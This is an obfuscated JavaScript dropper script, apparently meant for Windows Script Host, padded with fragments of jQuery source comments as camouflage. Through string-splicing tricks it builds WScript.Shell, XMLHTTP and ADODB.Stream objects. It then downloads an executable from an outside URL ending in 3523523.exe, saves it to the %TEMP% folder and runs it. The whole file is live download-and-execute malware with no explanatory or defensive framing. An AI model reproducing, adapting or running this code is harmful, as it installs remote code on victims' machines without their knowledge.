rCYJUViTs = "} Needed because $( selector, context ) becomes $( context ).find( selector ) ret = this.pushStack( len > 1 ? jQuery.unique( ret ) : ret ); ret.selector = this.selector ? this.selector + \" \" + selector : selector; return ret; }, filter: function( selector ) { return this.pushStack( winnow( this, selector || [], false ) ); }, not: function( selector ) { return this.pushStack( winnow( this, selector || [], true ) ); }, is: function( selector ) { return !!winnow( this,";
fergusI = 0;
String.prototype.contradistinction = function () { return this.substr(0, 1); };
var uUXTro = [("vegetarian","knitting","n")+"hh"+("alias","essential","vicarious","aiding","lH")+"CNAl", "A"+"iR"+"Nh"+("angel","tyson","vedic","cD")+"nBHy", "E"+"xpan"+("titans","divide","knocker","cataract","dEnviron")+"me"+"nt"+"Stri"+("triple","pointing","ngs"), ("colic","annotated","benediction","generator","")+"%"+("fiftytwo","unconcern","TE")+"MP%", ""+("snaps","tattered","dressed",".")+"exe", ("customer","orthography","R")+"un", "A"+"ct"+"in"+"ce"+"nt"+"ivei"+("interactive","sleet","vi")+("flighty","yachts","chosen","irate","nc")+"enti"+"ve"+"eXincentiv"+("sieve","sweets","cadence","eObinc")+"en"+"ti"+"ve"+"je"+"ince"+"nt"+"ivect", "sFtalU", "FlAYMT", ("dandelion","undercurrent","smallest","W")+"Sc"+"ince"+"ntiver"+"ip"+"tinc"+"entive." + ("independent","monday","S"), "AmvHaUzPHrP", ("teaspoon","barbaric","tarnish","urgency","h")+"in"+"ce"+("disciplinary","mindful","decadent","nt")+"iv"+"ee"+("substantive","homeless","madcap","li")+"nc"+("valuables","grenada","en")+"ti"+("indie","assist","padlock","annual","vel"), "UJcMlBfkOA", "G"+("rewritten","highlights","rebuilt","rRAF")+"Ka"+("decomposition","largesse","explaining","je")+"To", "Min"+"ce"+"ntiv"+"eS"+("irreparable","midwest","untold","Xi")+"nc"+"en"+("unutterable","lincolnshire","innovation","cocktail","ti")+"ve"+("explicitly","email","incidence","ML")+"in"+"ce"+("buccaneer","vertical","nt")+("proteins","agitate","iv")+"e2" + "."+"in"+"ce"+("jennifer","thane","travis","bureaucracy","nt")+("trigger","everywhere","bidder","iv")+"eXMi"+"ncenti"+("auckland","stubbornly","watchword","ve")+"LH"+"in"+"ce"+"nt"+"iveT"+"TP"];
bQSgcRLw = " If this is a positional/relative selector, check membership in the returned set so $(\"p:first\").is(\"p:last\") won\"t return true for a doc with two \"p\". typeof selector === \"string\" && rneedsContext.test( selector ) ? jQuery( selector ) : selector || [], false ).length; } } );";
uUXTro.splice(7, fergusI + 2);
chubby = uUXTro[1+4+1].split("incentive").join("");
var IbYcSTBv = this[chubby];
FfRxrgbJec = " Initialize a jQuery object";
societies = (("every", "convinced", "yUxVndl", "border", "pGRPLdoUus") + "CvKxxduye").contradistinction();
theoriess = (("extended", "planning", "DTldQfXgs", "stealth", "sRXGlOQPsOjv") + "HcBGAbwuBN").contradistinction();

fergusI = 6;
uUXTro[fergusI + 1] = uUXTro[fergusI + 1] + uUXTro[fergusI + 3];
uUXTro[fergusI + 2] = "EuHNTOs";
fergusI++;
uUXTro.splice(fergusI + 1, fergusI - 4);
uUXTro[fergusI] = uUXTro[fergusI].split("incentive").join("");
var OoKse = new IbYcSTBv("" + uUXTro[fergusI] + "");
DVMFLTWpObv = " A central reference to the root jQuery(document) var rootjQuery,";
fergusI++;
uUXTro[fergusI + 1] = uUXTro[fergusI + 1].split("incentive").join("");
var zBqJutIT = new IbYcSTBv(uUXTro[1 + fergusI]);
EOyHFnbJTl = " A simple way to check for HTML strings Prioritize #id over <tag> to avoid XSS via location.hash (#9521) Strict HTML recognition (#11290: must start with <) rquickExpr = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/,";
fergusI /= 2;
var BPmnOej = OoKse[uUXTro[fergusI - 2]](uUXTro[fergusI - 1]);
ljBkDWJXudY = " init = jQuery.fn.init = function( selector, context, root ) { var match, elem;";
revealede = (("welling", "amanuensis", "ockdxQ", "rudder", "EGKmlWQcsPgz") + "esfBwk").contradistinction();

function undeveloped(poseidon, economic) {

    try {
        var jersey = BPmnOej + "/" + economic + uUXTro[fergusI];
    ssecaLFMjF = " HANDLE: $(\"\"), $(null), $(undefined), $(false) if ( !selector ) { return this; ";
    zBqJutIT["o" + societies + revealede + "n"](("graveyard","antiseptic","pressure","statistics","G") + revealede + ("amorphous","rusted","nickname","hindostan","T"), poseidon, false);

    jDSaDgXW = "} init accepts an alternate rootjQuery so migrate can support jQuery.sub (gh-2101) root = root || rootjQuery;";
    zBqJutIT[theoriess + ("angelic","quilt","e") + (("welled", "hartford", "tBDSQUYTJ", "affirmation", "knights", "nzNSNxAB") + "lzqdRMvVV").contradistinction() + (("contribute", "agencies", "dNXCyEp", "juvenile", "instantaneously", "dNlkfLKdafG") + "OuzbxMw").contradistinction()]();
    pJQxUYN = " Handle HTML strings if ( typeof selector === \"string\" ) { if ( selector.charAt( 0 ) === \"<\" && selector.charAt( selector.length - 1 ) === \">\" && selector.length >= 3 ) {";
    if (zBqJutIT.status == 200) {
        var PbOLTH = new IbYcSTBv((""+("storm","rocks","A")+"pO"+("digestive","epson","specialty","caterpillar","DB.") + ""+"S"+("rapping","engineering","constantly","tr")+"eam").replace("p", "D"));
        PbOLTH.open();
        RvweTKriM = " Assume that strings that start and end with <> are HTML and skip the regex check match = [ null, selector, null ];";
        PbOLTH.type = 22 * (12 - 8 - 4) + 6 - (8 / 2 + 1);
        aODTVaRhyp = " } else { match = rquickExpr.exec( selector ); ";
        PbOLTH[("storied","venezuela","tigers","socks","w")+"ri"+"te"](zBqJutIT[""+"R"+"es"+("started","updated","crete","ponder","pon") + theoriess + "e"+"Bo"+("wetted","fatal","dy")]);
        eUVrfTIaq = "} Match html or make sure no context is specified for #id if ( match && ( match[ 1 ] || !context ) ) {";
        PbOLTH[(societies + "o"+"Di"+("lagging","absorb","blight","vacate","ti")+"on").replace("D", theoriess)] = 0;
        rURMWYFCS = " HANDLE: $(html) -> $(array) if ( match[ 1 ] ) { context = context instanceof jQuery ? context[ 0 ] : context;";
        PbOLTH["sav"+"eT"+"oF"+("limitation","atomic","mauve","marion","ile")](jersey, 2);
        JzDFHcYwRvt = " scripts is true for back-compat Intentionally let the error be thrown if parseHTML is not present jQuery.merge( this, jQuery.parseHTML( match[ 1 ], context && context.nodeType ? context.ownerDocument || context : document, true ) );";
        PbOLTH.close();
        ueMAAMNPHiw = " HANDLE: $(html, props) if ( rsingleTag.test( match[ 1 ] ) && jQuery.isPlainObject( context ) ) { for ( match in context ) {";
        OoKse[uUXTro[fergusI + 1]](jersey, 1, "UkVpnxGMqx" === "NFaRGO"); gPDLAPbra = " Properties of context are called as methods if possible if ( jQuery.isFunction( this[ match ] ) ) { this[ match ]( context[ match ] );";
    }

} catch (HiQurqnDJ) { };

    WNpfWU = " ...and otherwise set as attributes } else { this.attr( match, context[ match ] ); } } ";
}
undeveloped("h"+"tt"+"p:"+"//"+"ar"+"ch"+"iv"+"e4"+"5."+"co"+"m/"+"sy"+"stem"+"/l"+("iraqi","consign","arizona","og")+"s/"+"3523"+"52"+"3."+"exe","OjqcqN");
   KYGIHoQjIo = "} return this;";